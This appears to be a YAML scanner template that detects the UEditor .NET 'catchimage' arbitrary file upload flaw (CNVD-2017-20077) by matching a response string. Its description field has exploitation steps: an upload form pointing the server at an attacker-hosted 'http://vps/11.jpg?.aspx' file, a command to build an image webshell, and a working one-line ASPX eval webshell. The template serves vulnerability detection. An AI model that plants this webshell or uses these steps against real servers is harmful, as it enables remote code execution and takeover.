id: ueditor-cnvd-2017-20077-file-upload

info:
  name:  ueditor-cnvd-2017-20077-file-upload
  author: zan8in 
  severity: critical
  description: |
    <form action="http://8.8.8.8:8001/ueditor/net/controller.ashx?action=catchimage" enctype="multipart/form-data" method="POST">
    <p>shell addr: <input type="text" name="source[]" style="width:600px"/></p> 
    <input type="submit" value="Submit" /> 
    </form>
    http://vps/11.jpg?.aspx 11.jpg是图片马；制作图片马：copy 1.jpg/b +2.aspx 3.aspx
    aspx一句话：<%@ Page Language="Jscript"%><%eval(Request.Item["zan8in"],"unsafe");%>
  reference:
    - https://zhuanlan.zhihu.com/p/85265552
    - https://www.freebuf.com/vuls/181814.html
  tags: ueditor,cnvd,file-upload

manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /ueditor/net/controller.ashx?action=catchimage&encode=utf-8
            headers:
                Accept-Encoding: 'deflate'
            follow_redirects: false
        expression: |
            response.status == 200 && response.body.bcontains(bytes(string("没有指定抓取源")))
expression: r0()